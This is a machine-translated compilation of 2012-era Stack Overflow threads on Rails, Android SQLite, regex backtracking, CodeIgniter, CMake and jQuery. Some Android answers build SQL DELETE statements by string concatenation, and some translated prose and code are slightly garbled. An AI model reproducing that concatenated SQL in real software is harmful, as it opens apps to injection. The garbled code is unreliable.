                , '__EVENTTARGET': 'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$pager1$ctl00$ctl01',
                      'ctl00$ctl00$ContentPlaceHolder1$ItemListPlaceHolder$hfVSFileName': hxs.select(
                          ".//input[@id='ctl00_ctl00_ContentPlaceHolder1_ItemListPlaceHolder_hfVSFileName']/@value").extract()[
                                                                                          0]},
            meta={'curr': curr, 'total': total, 'flag': False},
            dont_click=True,
            callback=self.page_rs_50
        )
    else:
        for pro in self.pro_urls:
            yield Request("http://www.e3050.com/%s" % pro,
                callback=self.parse_product)

def parse_product(self, response):
    pass
    #TODO Implementation Required For Parsing 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T08:23:46.200

我没有广泛研究您的代码，但我看到了一些奇怪的东西：

```
 # Get last page number
        last_page = hxs.select('//span[@id="ctl00_ctl00_ContentPlaceHolder1_ItemListPlaceHolder_lbl_PageSize"]/text()').extract()[0]
        i = 1

        # preparing requests for each page
        while i < (int(last_page) / 5)  + 1:
            requests.append(Request("http://www.e3050.com/Items.aspx?cat=SON", callback=self.parse_product))
            i +=1 
```

首先，`i`您可以执行以下操作，而不是使用 进行这些操作：

```
 for i in xrange(1, last_page // 5 + 1): 
```

然后你做：

```
 requests.append(Request("http://www.e3050.com/Items.aspx?cat=SON", callback=self.parse_product)) 
```

您是否对同一个 URL 创建了许多请求？

# ruby-on-rails - twitter bootstrap下拉突然不起作用

> ID：10218587
> 
> 赞同：37
> 
> 时间：2012-04-18T21:51:20.400
> 
> 标签：ruby-on-rails, drop-down-menu, twitter-bootstrap

我想知道是否有人可以帮助我。我的引导下拉菜单突然停止工作。我不知道为什么。它以前工作过。我没有触及我的视图我的布局视图，所以我认为问题不存在。我很确定它与我的 javascript 有关，但我不知道它来自哪里。

我的宝石文件是...

```
gem 'rails', '3.2.3'
gem 'bootstrap-sass', '2.0.1'
gem 'bcrypt-ruby', '3.0.1'
gem 'faker', '1.0.1'
gem 'will_paginate', '3.0.3'
gem 'bootstrap-will_paginate', '0.0.5'
gem 'devise'
gem 'carrierwave'
gem 'rmagick'
gem 'delayed_job_active_record'
gem 'daemons'
gem 'make_voteable'
gem 'admin_data'
gem 'indextank' 
```

我的 application.js 是...

```
//= require jquery
//= require jquery-ui
//= require jquery_ujs
//= require bootstrap-dropdown
//= require bootstrap
//= require_tree . 
```

我猜这可能与我的配置文件有关？

* * *

## 回答 #1

> 赞同：108
> 
> 时间：2012-04-19T06:17:39.170

不得不搬家

```
//= require jquery 
```

以下

```
//= require bootstrap 
```

之内

```
application.js 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2012-09-05T14:47:49.007

如果预编译资产不起作用，请尝试删除预编译资产

`rake assets:clean`

我发现两次加载到资产管道中的下拉 js 似乎会立即打开和关闭下拉菜单，但在 Heroku/Production 中可以正常工作。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-07-15T17:36:25.700

我遇到了同样的问题，我找到了两种解决方法。

首先，让我告诉你我的设置：我按照引导站点上的说明下载了 bootstrap-dropdown.js。我把它放在资产/javascripts 中。我的 application.js 文件如下所示：

```
//= require jquery
//= require jquery_ujs
//= require twitter/bootstrap
//= require_tree . 
```

下拉菜单不起作用。

我在页面源代码中注意到 bootstrap-dropdown.js 的脚本标记出现了两次：（为简洁起见，我删除了不相关的内容）

```
<script type="text/javascript" src="/assets/jquery.js?body=1">
<script type="text/javascript" src="/assets/jquery_ujs.js?body=1">
<script type="text/javascript" src="/assets/twitter/bootstrap/bootstrap-dropdown.js?body=1">
<script type="text/javascript" src="/assets/twitter/bootstrap/bootstrap-scrollspy.js?body=1">
<script type="text/javascript" src="/assets/twitter/bootstrap.js?body=1">
<script type="text/javascript" src="/assets/bootstrap-dropdown.js?body=1">
<script type="text/javascript" src="/assets/bootstrap.js?body=1"> 
```

所以我`//= require_tree .`从 application.js 中删除了该行，重新启动了服务器，并且下拉菜单工作了！

然后我放回了这条线`//= require_tree .`，而是删除了文件 assets/bootstrap-dropdown.js，它再次起作用了！

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-05-31T13:37:05.110

我不明白这一点，但重新排序 //= require jquery 和 //= require bootstrap 似乎为我解决了两次问题。正如 Sasha 建议的那样，首先在 jquery 之上移动引导程序修复它。然后我做了更多的工作，准备在 rails 3.2.3 上使用 jruby 进行部署。预编译资产、warble 和下拉菜单在开发和生产中都停止工作。删除 public/assets，以及一些 .class 文件和 tmp 中的文件。没有效果。最后，我将 application.js 中的顺序移回上次失败事件之前的状态，即引导之前的 jquery，并且下拉菜单再次起作用。

对 application.js 的更改是否会触发某些缓存的重建，或者是问题根源的某些幕后进程？下次发生这种情况时，我将尝试对 application.js 进行一个简单的更改，看看是否有任何作用。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-10-28T14:26:22.260

我在我的开发机器上遇到了这个问题，但我的生产服务器运行良好。我注意到，虽然在 application.js 中重新排序 js 需要修复开发中的问题（下拉菜单再次工作），但要小心，因为这会杀死我在生产中的下拉菜单。我不得不回去把它们放回原处，让生产重新开始工作。现在，我只是在需要时在 dev 中临时更改它们。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-06-12T11:55:47.170

再次预编译资产为我解决了这个问题

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-06-27T17:02:21.557

我也有这个问题......它与rails turbolinks有关。在初始页面加载时，下拉菜单不起作用，但在刷新后它们会起作用。而且，这是因为使用 turbo 链接时，某些 Dom 元素可能不会每次都被加载/重新加载。所以，我的下拉菜单停止工作（除其他外）。rails 4 对此的修复是添加 jquery.turbolinks gem [https://github.com/kossnocorp/jquery.turbolinks](https://github.com/kossnocorp/jquery.turbolinks)。我发现（后来在一些博客中遇到）这个 gem 的一件事是 javascript 标记必须在头部内部。自述文件没有提到这一点......但是

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-11-27T22:47:02.860

我找到了替代方案！所有这些解决方案都不适合我。我没有在点击时触发下拉菜单，而是在悬停时触发它。放在页面底部的脚本标签中。代码来自：[http ://codedecoder.wordpress.com/2013/10/21/bootstrap-drop-down-menu-not-working-rails/](http://codedecoder.wordpress.com/2013/10/21/bootstrap-drop-down-menu-not-working-rails/)

```
$(document).ready(function(){
    $('.navbar .dropdown').hover(function() {
        $(this).find('.dropdown-menu').first().stop(true, true).delay(250).slideDown();
    }, function() {
        $(this).find('.dropdown-menu').first().stop(true, true).delay(100).slideUp()
    });
n}) 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2018-04-12T05:13:40.970

还要确保`//require bootstrap-sprockets`您的 application.js 中没有。我对此发表了评论，它对我有用。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-05-02T02:48:44.210

请参阅[Rails 3.1 资产 - 开发中的奇怪服务](https://stackoverflow.com/questions/8356251/rails-3-1-assets-strange-serving-in-development)

在 application.js 的调试模式中包含压缩版本的错误

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-07-03T10:34:18.117

预编译资产不起作用。在 jquery 在开发中工作但不在生产中之前放置下拉列表删除下拉列表仍然在开发中工作：-O

放置正确的顺序并删除 public/assets 文件夹中的所有内容使其在开发中工作。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2012-12-11T15:20:36.063

票[#5145](https://github.com/rails/rails/issues/5145)最近为此关闭。该修复程序已恢复，但最后提供了一个特定于应用程序的解决方案，并且对我有用。确保也清除浏览器缓存。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2015-01-10T16:49:29.607

`//= require jquery`向下移动`//= require bootstrap`并升级`gem 'bootstrap-sass'`到**2.3.0.1**解决了我的问题。

我想添加我上面提到的解决方案，它只适用于 Localhost，但不适用于 Heroku。在我的情况下，解决方案是：

`//= require jquery`
`//= require jquery_ujs`
`//= require bootstrap`
`//= require_tree .`

`gem bootstrap-sass`, **2.3.0.1**

并且`<%= javascript_include_tag 'application', 'data-turbolinks-track' => true %>`需要在“ **_header.html.erb ”中并从“** **application.html.erb** ”中删除。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2015-01-15T05:42:20.300

我遇到了这个错误，事实证明我的 CSS 阻止了下拉菜单的工作。

具体来说，我有“溢出：隐藏；” 在我的标题导航 CSS 中。删除它解决了这个问题。

# java - 如何将 LookAndFeel 设置为瞬态以允许 View 的可序列化

> ID：10218589
> 
> 赞同：0
> 
> 时间：2012-04-18T21:51:41.693
> 
> 标签：java, serialization, look-and-feel

我有一个要保存到磁盘的控制器。它包含一个我也想序列化的视图。然而`lookAndFeel`，它是不可序列化的。我尝试时遇到的错误是：

```
java.io.NotSerializableException: com.sun.java.swing.plaf.windows.XPStyle 
```

这是有道理的，但是我该如何做到这一点，以便`ObjectOutputStream`忽略我无法控制的某些变量？我可以接受“你不能”的答案。但我希望有一种方法可以做到这一点:) 谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-06T06:04:19.230

我的解决方案是将`transient`关键字放在我的控制器中的任何视图前面，并在重新加载对象时重新加载这些视图。无论如何，这可能就是它应该的方式。感谢天堂的[MVC](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)层。

# iphone - Monotouch中的自定义UITabBar

> ID：10218593
> 
> 赞同：1
> 
> 时间：2012-04-18T21:52:16.573
> 
> 标签：iphone, ios5, xamarin.ios, uitabbarcontroller, uitabbar

我正在尝试创建一个自定义 UITabBar。我有常规的 UITabBarController 工作正常，但最佳情况下，我希望它看起来像这样：![uitabbar 的图像](../Images/13cbb66f3118a3ce19dbc1d00116421f.png)

解决这个问题的最佳方法是什么？我似乎在 Monotouch 中找不到任何有用的示例。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:39:40.807

我想制作这样一个标签栏的方式只是一堆自定义按钮，这些按钮被排列和编程为看起来像一个标签栏，但实际上它们只是按钮。我能够在我的一个应用程序中重新创建 instagram 标签栏，它看起来非常相似。当我自学时，这是我想出如何做这种类型的标签栏的唯一方法。

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T10:59:04.973

关于如何自定义标签栏有一些非常好的解释 - 特别是在[http://idevrecipes.com/2010/12/16/raised-center-tab-bar-button/](http://idevrecipes.com/2010/12/16/raised-center-tab-bar-button/) - [https://github 上的源代码。 com/boctor/idev-recipes/tree/master/RaisedCenterTabBar](https://github.com/boctor/idev-recipes/tree/master/RaisedCenterTabBar)

我相信我已经看到了相同代码的 github monotouch 示例，但我现在找不到它！

# javascript - 如何使这个正则表达式不会导致“灾难性回溯”？

> ID：10218594
> 
> 赞同：6
> 
> 时间：2012-04-18T21:52:28.477
> 
> 标签：javascript, regex, backtracking

我正在尝试使用从[http://daringfireball.net/2010/07/improved_regex_for_matching_urls获得的 URL 匹配正则表达式](http://daringfireball.net/2010/07/improved_regex_for_matching_urls)

```
(?xi)
\b
(                       # Capture 1: entire matched URL
  (?:
    https?://               # http or https protocol
    |                       #   or
    www\d{0,3}[.]           # "www.", "www1.", "www2." … "www999."
    |                           #   or
    [a-z0-9.\-]+[.][a-z]{2,4}/  # looks like domain name followed by a slash
  )
  (?:                       # One or more:
    [^\s()<>]+                  # Run of non-space, non-()<>
    |                           #   or
    \(([^\s()<>]+|(\([^\s()<>]+\)))*\)  # balanced parens, up to 2 levels
  )+
  (?:                       # End with:
    \(([^\s()<>]+|(\([^\s()<>]+\)))*\)  # balanced parens, up to 2 levels
    |                               #   or
    [^\s`!()\[\]{};:'".,<>?«»“”‘’]        # not a space or one of these punct chars
  )
) 
```

根据对[另一个问题](https://stackoverflow.com/questions/10218300/why-does-q-testxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx-take-so-long)的回答，似乎有些情况会导致此正则表达式[灾难性地回溯](http://www.regular-expressions.info/catastrophic.html)。例如：

```
var re = /\b((?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’]))/i;
re.test("http://google.com/?q=(AAAAAAAAAAAAAAAAAAAAAAAAAAAAA)") 
```

... 可能需要很长时间才能执行（例如在 Chrome 中）

在我看来，问题在于这部分代码：

```
(?:                       # One or more:
    [^\s()<>]+                  # Run of non-space, non-()<>
    |                           #   or
    \(([^\s()<>]+|(\([^\s()<>]+\)))*\)  # balanced parens, up to 2 levels
  )+ 
```

...这似乎大致相当于`(.+|\((.+|(\(.+\)))*\))+`, 看起来它包含`(.+)+`

我可以做出改变来避免这种情况吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-18T22:20:03.893

将其更改为以下内容应该可以防止灾难性的回溯：

```
(?xi)
\b
(                       # Capture 1: entire matched URL
  (?:
    https?://               # http or https protocol
    |                       #   or
    www\d{0,3}[.]           # "www.", "www1.", "www2." … "www999."
    |                           #   or
    [a-z0-9.\-]+[.][a-z]{2,4}/  # looks like domain name followed by a slash
  )
  (?:                       # One or more:
    [^\s()<>]+                  # Run of non-space, non-()<>
    |                           #   or
    \(([^\s()<>]|(\([^\s()<>]+\)))*\)  # balanced parens, up to 2 levels
  )+
  (?:                       # End with:
    \(([^\s()<>]|(\([^\s()<>]+\)))*\)  # balanced parens, up to 2 levels
    |                               #   or
    [^\s`!()\[\]{};:'".,<>?«»“”‘’]        # not a space or one of these punct chars
  )
) 
```

所做的唯一更改是删除正则表达式的每个“平衡括号”部分中的`+`第一个之后。`[^\s()<>]`

这是用 JS 测试的单行版本：

```
var re = /\b((?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>]+|\(([^\s()<>]|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’]))/i;
re.test("http://google.com/?q=(AAAAAAAAAAAAAAAAAAAAAAAAAAAAA") 
```

原始正则表达式的问题部分是平衡括号部分，为了简化回溯发生原因的解释，我将完全删除其中的嵌套括号部分，因为它在这里不相关：

```
\(([^\s()<>]+|(\([^\s()<>]+\)))*\)    # original
\(([^\s()<>]+)*\)                     # expanded below

\(                # literal '('
(                 # start group, repeat zero or more times
    [^\s()<>]+        # one or more non-special characters
)*                # end group
\)                # literal ')' 
```

考虑一下 string 在这里发生了什么`'(AAAAA'`，文字`(`会匹配，然后`AAAAA`会被组消耗，而`)`将无法匹配。在这一点上，该组将放弃一个`A`，留下`AAAA`被俘并试图在这一点上继续比赛。因为该组有一个追随者，所以该组可以匹配`*`多次，所以现在您将拥有match ，然后在第二次通过。当这失败时，原始捕获将放弃额外的捕获并由第二个捕获消耗。`([^\s()<>]+)*``AAAA``A``A`

这将持续很长时间，导致以下尝试匹配，其中每个逗号分隔的组表示该组匹配的不同时间，以及该实例匹配的字符数：

```
AAAAA
AAAA, A
AAA, AA
AAA, A, A
AA, AAA
AA, AA, A
AA, A, AA
AA, A, A, A
.... 
```

我可能算错了，但我很确定在确定正则表达式无法匹配之前，它总共需要 16 个步骤。随着您继续向字符串中添加其他字符，解决此问题的步骤数呈指数增长。

通过删除 并将其`+`更改为`\(([^\s()<>])*\)`，您将避免这种回溯情况。

重新添加交替以检查嵌套括号不会导致任何问题。

请注意，您可能希望在字符串的末尾添加某种锚点，因为当前`"http://google.com/?q=(AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"`将匹配到 之前`(`，所以`re.test(...)`会返回`true`因为`http://google.com/?q=`匹配。

# actionscript-3 - AS3 检测到多个键盘按键被按下

> ID：10218603
> 
> 赞同：2
> 
> 时间：2012-04-18T21:53:16.170
> 
> 标签：actionscript-3

有没有办法让我检测是否使用 AS3 将“a”和“b”按在一起。

如果是，我可以让一个movieclip可见。

看起来很简单，但我似乎无法找到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:51:44.280

只需使用[Senocular KeyObject 类](http://www.senocular.com/flash/actionscript/?file=ActionScript_3.0/com/senocular/utils/KeyObject.as)来检测一个键是否关闭。监听舞台上的 KeyboardEvent.KEY_DOWN 事件，看看你的两个键是否都按下了。

该类在标题注释中有一个小示例用法。

# android - Android - 从 sqlite 中删除一行

> ID：10218610
> 
> 赞同：0
> 
> 时间：2012-04-18T21:53:42.420
> 
> 标签：android, xml, eclipse, sqlite, delete-row

到目前为止，我正在开发一个应用程序来发展我的知识，我创建了一个日历应用程序，用户可以在单击日期时进行预约。然后我有一个删除按钮，它打开在一个新活动中创建的所有约会，我有：一个显示所有约会的列表视图一个显示所选约会（由用户选择删除）的文本视图和一个按钮删除。我希望此按钮从数据库中删除选定的约会（行）。到目前为止，我已经设法写入数据库并显示信息，但我似乎无法让它删除我想要的行..

这就是我使用列表视图中选定的约会（行）填充文本视图的方式

```
//populate textview with selected item from sqlite data
    public void onListItemClick(ListView parent, View v, int position, long id) {
        selection.setText(stg1[position]);
        delBtn.setEnabled(true);
    } 
```

这是我的删除按钮的动作监听器我需要在这里放置什么来删除选定的行（我尝试了很多方法，但我的应用程序只是崩溃了

```
public void onClick(View v) {
    switch(v.getId()){

    case R.id.removeBtn:

        break;
    }

} 
```

希望我足够清楚..任何帮助将不胜感激，非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T22:51:40.863

您可以使用以下内容：

```
db.delete("UsersTable", usernameString +"="+usernameString+ " AND " +this.userId+"="+userId) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T15:25:30.343

假设您使用的是 SQLiteDatabase 类，您总是可以执行以下操作：

```
db = SQLiteDatabase.openDatabase("/data/data/yourpackage/databases/dbname.db", null, SQLiteDatabase.OPEN_READWRITE);
db.execSQL("delete from your_table where your_column = '" + some_value + "'");
db.close(); 
```

我不知道您的代码的范围，但是根据您提供给我们的内容，我会说将该块放入您的 onClick()

然后就像 slayton 所说，使用 notifyDatasetChanged() 更新您的列表。否则它将从数据库中删除，但在重新启动填充列表的查询之前，您永远不会知道它。

此外，您可能希望创建一个全局变量来说明当前选择的列表项。这样你就可以在你的 onListItemClick() 中设置它，然后根据你之前在 onClick 中选择的内容快速删除它，而不必弄乱那个 switch 语句。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-17T04:28:45.550

这就是你需要的。在您的数据库处理程序类中，添加

```
 int id=1;
  SQLiteDatabase db = this.getWritableDatabase();
  db.execSQL("DELETE FROM "+TABLE_NAME+" WHERE "+KEY_ID+" = "+id+";");
  db.close(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T22:02:21.547

不清楚是要从 SQLite 表还是从列表视图中删除一行。

如果要从列表视图中删除一行，只需从数组中删除该项目，然后调用`notifyDataSetChanged()`

如果要从 SQLite DB 中删除该行，则需要编写`DELETE`查询：[http ://www.sqlite.org/lang_delete.html](http://www.sqlite.org/lang_delete.html)

# codeigniter - CodeIgniter 在运行另一个循环后继续一个 foreach 循环

> ID：10218617
> 
> 赞同：0
> 
> 时间：2012-04-18T21:54:10.603
> 
> 标签：codeigniter

我在以下代码中执行了 2 个单独的 foreach 循环。最后，在第二个 foreach 循环之后，我有 $row->websiteURL 输出。问题是 $row->websiteURL 是第一个循环的一部分。因此，当我运行代码时出现以下错误：

> 遇到 PHP 错误
> 
> 严重性：通知
> 
> 消息：未定义的属性：stdClass::$websiteURL
> 
> 文件名：views/projects.php
> 
> 行号：135
> 
> " 目标="_blank">

在第二个 foreach 完成后，我将如何继续第一个 foreach 循环？

```
<table style="width: 41%">
<?php   $query  = $this->db->query("SELECT * FROM projects ORDER BY idprojects DESC");
        foreach ($query->result() as $row) { ?>
    <tr>
        <td style="height: 15px">
        <div class="auto-style2">
            <em><span class="auto-style1"><?=$row->projectName?></span></div>
        <table cellpadding="5" style="width: 535px; height: 66;">
            <tr>
                <td class="box1" style="height: 49px; width: 800px;">
        <table cellpadding="0" cellspacing="0" style="width: 466px; height: 185px">
            <!-- MSTableType="layout" -->
            <tr>
                <td valign="top" style="width: 225px">
            <em>
        <table style="width: 100%">
            <tr class="box1">
                <td class="innerbox" style="height: 88px"><em><span class="text1">Project name</span>:
                <span class="underlined-link"><?=$row->projectName?></span><br>
                <span class="text1">Description</span>: <?=$row->projectDesc?><br><span class="text1">Start 
                date</span>: <?=$row->startDate?><br><span class="text1">Finised date</span>: 
                <?=$row->finishedDate?><br><span class="text1">Created for</span>: 
                <?=$row->createdFor?><br><span class="text1">Contributers</span>:
                <span class="underlined-link"><?=$row->contributors?></span></em></td>
            </tr>
        </table>
        </em></td>
                <td style="width: 12px">&nbsp;</td>
                <td valign="top" style="height: 185px; width: 229px">
            <em>
<?php           $query  = $this->db->query("SELECT * FROM screenshots ORDER BY idscreenshot DESC");
                foreach ($query->result() as $row) { ?>
                <img alt="" src="<?=$row->screenshotURI?>" width="231" height="187"></em>&nbsp;</td>
            </tr>
<?php } ?>
        </table>
                <br>
                <a style="text-decoration:none" href="<?=$row->websiteURL?>" target="_blank"><div class="link1">
                    View This Product</div></a>
                </td>
            </tr>
        </table>
        </em></td>
    </tr>
<?php } ?>
        </table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:00:42.500

您需要像这样在第二个 foreach 中更改变量：

```
 $query  = $this->db->query("SELECT * FROM screenshots ORDER BY idscreenshot DESC");
                foreach ($query->result() as $row2) { ?>
                <img alt="" src="<?=$row2->screenshotURI?>" width="231" height="187"></em>&nbsp;</td> 
```

$row 变量仍在范围内，它正在第一个查询中查找。如果您正在执行内部 foreach 循环，则不能将“item”变量命名为与外部 foreach 相同。

更重要的是：

```
foreach($arr as $row):
   foreach($arr as $row2):
      //do something
   endforeach;
 endforeach; 
```

回到更大的问题。您不应该在视图中查询数据。数据在模型中进行操作。控制器加载模型，使用模型获取信息，然后将信息传递给视图。如果您是 MVC 新手，这可能是一个难以掌握的概念。一旦你得到这个工作，专注于将这些查询移动到模型中它们自己的函数中，并以这种方式检索信息。

# solr - Solr 最小匹配自定义

> ID：10218619
> 
> 赞同：0
> 
> 时间：2012-04-18T21:54:19.830
> 
> 标签：solr, lucene

我有一个案例，我想像这样匹配：

查询：abcd efgh ijkl mnop

在此之后，查询受到 NGram 标记器的影响，每个单词被分成 2 个 gram 标记。

例如）查询被分成，

ab,bc,cd,ef,fg,gh,ij,jk,kl,mn,no,op

现在，在匹配时，我希望为单词中的标记定制最小匹配。

我的意思是，默认情况下，当与一个单词对应的任何一个标记与索引文档匹配时，mm=1，则返回该索引文档。如果我给 mm=2，那么任何 2 个单词中的任何一个标记都需要匹配要返回的索引文档。

但我想要的是：仅当任何 'm' 标记每个匹配 mm=num 个单词时才返回文档。

例如）我希望从至少 3 个单词中选择至少 2 个标记，以便选择索引文档。

似乎 Lucene 的 IndexSearcher 做了这个核心部分。我是否需要更改代码或任何其他可以执行上述操作的配置？

提前致谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T14:11:12.923

这并不是您所要求的，但我猜您的基本问题是“我如何确保模糊搜索只返回与原始查询‘接近’的内容？”

语法是这样做的`foo~.8`- 请参阅[文档](http://lucene.apache.org/core/old_versioned_docs/versions/2_9_1/queryparsersyntax.html)。基本上，.8 是编辑（Levenstein）距离除以单词长度的量度。

如果你想坚持计算必须匹配的对的想法，你可以做一些数学来找出最小的莱文斯坦距离需要是多少。

# matlab - 如何使用 CMake 和 Visual Studio 2010（64 位）构建 MATLAB R2011a（64 位）mex 文件？

> ID：10218626
> 
> 赞同：2
> 
> 时间：2012-04-18T21:55:07.633
> 
> 标签：matlab, visual-c++, 64-bit, cmake, mex

我想写一个`CMakeLists.txt`这样的 CMake 编写一个 Visual Studio 2010 (64 bit) 解决方案文件来从 C++ 代码为 MATLAB R2011a (64 bit) 构建一个 mex 函数`example.cxx`。

1.  我不想使用 MATLAB 的编译器包装器`mex`，而是设置 Visual Studio 解决方案文件，以便 Visual C++ 链接相关的 MATLAB 库。
2.  `example.cxx`除了 mex 文件所需的 MATLAB 库之外，没有其他依赖项。
3.  CMake 2.8.7 设置正确，因此它使用 Visual Studio 2010 的 64 位生成器。

我现在做的事情的本质是

```
find_package(Matlab)
add_library(example STATIC example.cxx)
target_link_libraries(example ${MATLAB_LIBRARIES}) 
```

编译器和链接器都不会发出任何错误。我将输出安装在 MATLAB 路径中的目录中`example.lib`的名称下。`example.mexw64`当我`example`从 MATLAB 调用时，我收到错误消息

```
??? Invalid MEX-file
'C:\...\example.mexw64':
C:\...\example.mexw64 is not a valid Win32 application. 
```

欢迎任何建议！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T05:57:39.970

我遇到了同样的问题，[这个链接](http://matitk-cmake.blogspot.ca/)非常有帮助（顺便说一句，它也是如何在 MATLAB MEX 文件中使用[ITK的一个很好的例子）。](http://www.itk.org/)我认为对于您的情况，您需要将链接标志添加`"/export:mexFunction"`到您的`CMakeLists.txt`文件中。下面的例子：

```
PROJECT(example)
FIND_PACKAGE(Matlab REQUIRED)

INCLUDE_DIRECTORIES(${MATLAB_INCLUDE_DIR})

ADD_LIBRARY(example MODULE example.cpp)
ADD_DEFINITIONS(-DMATLAB_MEX_FILE)

# Needed for entry point.
SET_TARGET_PROPERTIES(example
PROPERTIES
LINK_FLAGS "/export:mexFunction"
)

# Change the dll extension to a mex extension.
set_target_properties(example PROPERTIES SUFFIX ".mexw64")

TARGET_LINK_LIBRARIES(example ${MATLAB_LIBRARIES}) 
```

请注意，这`FIND_PACKAGE(Matlab)`似乎并没有那么好用，所以这对某些人来说可能是个问题。我不得不通过将 MATLAB 路径硬编码到 CMakeLists.txt 中来解决这个问题（本示例中未显示）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:10:40.667

Matlab mex 文件是 dll 不是库。尝试让 cmake（不是这方面的专家）创建一个动态的库，而不是静态的。

# escaping - 用 gettext 打印

> ID：10218631
> 
> 赞同：4
> 
> 时间：2012-04-18T21:55:23.390
> 
> 标签：escaping, gettext

我想输出这个字符串的翻译

`By clicking on "Post"`

使用gettext，如何转义引号？我应该尝试`\ "`吗？

```
msgid "By clicking on"
msgstr "" 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-19T09:46:36.573

是的，您需要使用反斜杠 (\") 转义双引号。

[gettext 手册](http://www.gnu.org/savannah-checkouts/gnu/gettext/manual/html_node/PO-Files.html#PO-Files)说明如下：

> 未翻译和已翻译的两个字符串在 PO 文件中以各种方式引用，使用“分隔符和 \ 转义符
> 
> ...
> 
> *未翻译字符串*和*翻译字符串*中的每一个都尊重字符串的 C 语法，包括周围的引号和嵌入的[反斜杠转义序列](https://en.wikipedia.org/wiki/Escape_sequences_in_C#Table_of_escape_sequences)。

# jquery - Jquery代码 - 几乎想通了

> ID：10218633
> 
> 赞同：0
> 
> 时间：2012-04-18T21:55:34.407
> 
> 标签：jquery, jquery-ui

我整天都在努力让它发挥作用，但非常不成功。我是 jquery 的新手，可以使用一些帮助来组合 jquery 函数。

我正在使用以下代码进行幻灯片放映：

```
$(function() {
    $("#foo3").carouFredSel({
        items: 1,
        prev: {
            button: "#foo3_prev",
            key: "left"
        },
        next: {
            button: "#foo3_next",
            key: "right"
        },
        auto: {
            duration: 1000
        },
        scroll: {
            items: 1,
            duration: 1000,
            mousewheel: true,
            wipe: true,
            pauseOnHover: true,
            onAfter: function() {
              if ( $(this).triggerHandler( "currentPosition" ) == 0 ) {
              $(this).trigger( "pause" );
            }
        }
    },
  })
  .parent()
  .css("margin", "auto");       
}); 
```

并且尝试将以下功能合并到其中失败：

```
 $("#foo3").carouFredSel({
auto    : false,
scroll  : {
    duration : 0.5
}
}).find("li").click(function() {
var deviation = parseInt( $("#foo3_deviation").val() );
$("#foo3").trigger("slideTo", [$(this), deviation]);
}).css("cursor", "pointer"); 
```

我需要维护第一组代码中的设置，但添加单击幻灯片 (li) 以前进到下一张图像的功能。

我不知道您是否需要更多信息来提供帮助，但如果需要，请告诉我。

非常感谢您的帮助。

**为了澄清：**

我需要添加以 .find(li).click(function() 开头的最后一段代码

进入代码的第一部分，通过单击图像以及自动滚动来制作我现有的幻灯片[http://2938.sandbox.i3dthemes.net/index.html功能。](http://2938.sandbox.i3dthemes.net/index.html)

**修订：**

我设法做到了这一点……

```
$(function() {

        $("#foo3").carouFredSel({
            auto    : true,
            scroll  : {
            items: 1,
                duration: 1000,
                mousewheel: true,
                wipe: true,
                pauseOnHover: true,
               onAfter: function() {
            if ( $(this).triggerHandler( "currentPosition" ) == 0 ) {
              $(this).trigger( "pause" );
             }
          }},
            }).find("li").click(function() {
            var deviation = parseInt( $("#foo3_deviation").val() );
            $("#foo3").trigger("slideTo", [$(this), deviation]);
            }).css("cursor", "pointer");
          }); 
```

现在需要弄清楚如何从第一段代码中获取此片段...

```
 }).parent()
    .css("margin", "auto"); 
```

任何人都可以帮助...？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T15:30:40.867

尝试这个：

```
$(function() {

  $("#foo3").carouFredSel({
    auto    : true,
    scroll  : {
      items       : 1,
      duration    : 1000,
      mousewheel  : true,
      wipe        : true,
      pauseOnHover: true,
      onAfter     : function() {
        if ( $(this).triggerHandler( "currentPosition" ) == 0 ) {
          $(this).trigger( "pause" );
        }
      }
    }
  })
  .find("li")
  .click(function() {
    var deviation = parseInt( $("#foo3_deviation").val() );
    $("#foo3").trigger("slideTo", [$(this), deviation]);
  })
  .css("cursor", "pointer")
  .end()
  .parent()
  .css('margin','auto');

}); 
```

